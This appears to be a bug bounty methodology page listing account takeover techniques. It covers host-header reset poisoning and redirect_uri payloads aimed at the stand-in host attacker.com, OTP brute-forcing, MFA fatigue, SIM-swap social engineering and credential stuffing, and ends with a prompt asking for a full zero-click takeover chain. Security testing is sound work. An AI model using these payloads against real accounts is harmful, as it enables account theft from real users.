---
id: "account-takeover"
title: "Account Takeover Methodology - Every Vector"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["account-takeover", "password-reset", "oauth", "token-leakage", "mfa-bypass", "ato", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["oauth-jwt-saml-bypasses", "idor-bola", "business-logic-flaws"]
updated: "2026-03-30"
---

## Overview

Account takeover (ATO) is the holy grail of bug bounty findings — direct impact on user security. Every auth flow has potential weaknesses. This guide covers every known vector from password resets to OAuth to token leakage. Payout: $2k-$50k+.

## Password Reset Poisoning

### Host Header Injection
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
If the app generates reset links using the Host header: `https://attacker.com/reset?token=SECRET`

### Other header vectors
```http
X-Forwarded-Host: attacker.com
X-Original-URL: https://attacker.com
Referrer: https://attacker.com
Origin: https://attacker.com
```

### Token in Referer
```
1. Request password reset for victim
2. Reset page loads third-party resources (analytics, CDN)
3. Token leaks in Referer header to third party
```

### Token Predictability
```
- Sequential tokens (token=1001, 1002, 1003...)
- Timestamp-based (brute-force the time window)
- MD5(email) or MD5(email + timestamp)
- UUID v1 (time-based, predictable)
- Short tokens (4-6 digits → brute-force)
```

### Token Not Invalidated
```
- Token reusable after password change
- Multiple valid tokens at once (request 10, all work)
- Token doesn't expire (test after 24h, 7 days)
- Token not tied to specific email (use for any account)
```

## OAuth/SSO Takeover

### Redirect URI Manipulation
```
# Open redirect to steal auth code
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com@attacker.com
?redirect_uri=https://target.com%0d%0aHost:attacker.com
?redirect_uri=https://target.com/.attacker.com
?redirect_uri=https://target.com/callback?next=https://attacker.com
```

### State Parameter Issues
```
- Missing state parameter → CSRF login
- Static/predictable state → token fixation
- State not validated on callback
```

### Provider Confusion
```
- Link attacker's social account to victim's app account
- Race condition during account linking
- Email mismatch between provider and app
```

## Token Leakage

### Where tokens leak
```
- URL query parameters (logged by proxies, analytics, referrer)
- Browser history
- Server logs
- Error messages
- API responses with other users' tokens
- WebSocket messages
- Cache (shared proxies caching auth responses)
- CORS misconfiguration (attacker origin can read responses)
```

### JWT-specific leakage
```
- JWT in URL parameters
- JWT stored in localStorage (accessible via XSS)
- JWT not rotated on password change
- JWT with long/no expiry
- Refresh token in response body (steal via XSS)
```

## MFA Bypass

```
# Rate limiting absent on OTP endpoint
# Brute-force 6-digit OTP (1M combinations, often no lockout)

# OTP in response
# Check response body, headers, or error messages for the OTP

# Backup codes
# Predictable, reusable, or default backup codes

# MFA fatigue
# Send push notifications repeatedly until victim approves

# SIM swap
# Social engineer the carrier to port victim's number

# Session fixation after MFA
# Complete MFA on your account, fix session to victim

# Skip MFA step
# Direct URL access to post-MFA pages
# Change request flow (skip step 2, go to step 3)
# Remove MFA parameter from request

# Disable MFA
# CSRF on MFA disable endpoint
# IDOR — disable another user's MFA
```

## Registration & Login Flaws

```
# Duplicate registration
# Register with victim's email with different case: Victim@target.com
# Unicode normalization: víctim@target.com → victim@target.com

# Race condition on registration
# Register same email simultaneously, one gets the other's session

# Default credentials
# admin:admin, test:test, admin:password, root:root

# Username enumeration
# Different responses for valid vs invalid usernames
# Timing differences (bcrypt on valid, fast reject on invalid)

# Credential stuffing
# Breach databases + password reuse
```

## Session Management

```
# Session fixation
# Set victim's session cookie before they authenticate

# Session not invalidated on password change
# Old sessions remain valid after password change

# Concurrent session limit bypass
# No limit on simultaneous sessions

# Session token in URL
# Referrer leakage, browser history, proxy logs

# Insufficient session entropy
# Short or predictable session tokens
```

## Deep Dig Prompts

```
Given this application's auth system [describe login, registration, password reset, OAuth, MFA]:
1. Map every authentication flow step by step.
2. Test password reset for host header injection, token predictability, and token reuse.
3. If OAuth is used, test redirect_uri manipulation and state parameter validation.
4. Check MFA for bypass vectors (rate limiting, response leakage, step skipping).
5. Test session management (fixation, invalidation on password change, concurrent limits).
6. Identify token leakage points (URL params, referrer, CORS, error messages).
7. Craft a complete account takeover chain for a zero-click or one-click attack.
```

## Tools

- **Burp Suite** — Auth testing with Repeater, Intruder
- **Autorize** — Burp extension for auth testing
- **ffuf** — Brute-force OTP, tokens, credentials
- **Hydra** — Multi-protocol brute forcer
- **oauth-redirect-checker** — Test OAuth redirect URI validation
